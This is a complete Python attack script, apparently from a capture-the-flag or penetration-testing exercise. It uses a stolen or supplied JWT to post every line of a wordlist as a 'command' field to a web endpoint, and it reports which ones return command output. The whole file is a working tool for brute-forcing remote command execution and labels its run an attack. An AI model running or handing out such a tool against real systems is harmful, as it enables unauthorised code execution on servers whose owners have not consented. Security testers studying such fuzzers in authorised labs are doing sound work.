import requests
import sys

# --- CHECK ARGUMENTS ---
if len(sys.argv) < 4:
    print("\033[93mUsage: python3 fuzz_command.py <URL> <TOKEN> <WORDLIST>\033[0m")
    sys.exit(1)

URL = sys.argv[1]
TOKEN = sys.argv[2]
WORDLIST = sys.argv[3]

HEADERS = {
    'Content-Type': 'application/json',
    'Authorization': f'Bearer {TOKEN}'
}

def start_fuzz():
    # Initialize session to reuse the TCP connection
    session = requests.Session()
    session.headers.update(HEADERS)
    session.cookies.set('persistentSession', 'no')

    try:
        with open(WORDLIST, 'r') as f:
            print(f"[*] Starting attack using wordlist: {WORDLIST}")
            print(f"[*] Target URL: {URL}")

            for line in f:
                cmd = line.strip()
                if not cmd:
                    continue
                
                try:
                    # Send payload as JSON
                    resp = session.post(URL, json={"command": cmd}, timeout=5)
                                        
                    # Check for authentication failure (Token expired or invalid)
                    if resp.status_code in [401, 403]:
                        print(f"\n[!] Authentication Error (Status {resp.status_code}). Check your JWT Token.")
                        return

                    # Check for successful execution (Presence of "output" key)
                    if "output" in resp.text:
                        try:
                            # Attempt to parse and display only the command output
                            json_data = resp.json()
                            result = json_data.get('output', 'No output field found.')
                            print(f"\n\033[92m[+] SUCCESS: {cmd}\033[0m")
                            print(f"--- OUTPUT ---\n{result}\n--------------")
                        except ValueError:
                            # Fallback if the response is not valid JSON but contains the string
                            print(f"\n\033[92m[+] SUCCESS (Raw Response): {cmd}\033[0m")
                            print(f"{resp.text}\n")
                    else:
                        # Print progress dots for failed attempts
                        print('.', end='', flush=True)

                except requests.exceptions.RequestException:
                    # 'X' represents a connection error or timeout for a specific payload
                    print('X', end='', flush=True)

    except FileNotFoundError:
        print(f"\n[!] Error: Wordlist file '{WORDLIST}' not found.")
    except KeyboardInterrupt:
        print(f"\n[!] Aborted by user.")
    except Exception as e:
        print(f"\n[!] An unexpected error occurred: {e}")

if __name__ == "__main__":
    start_fuzz()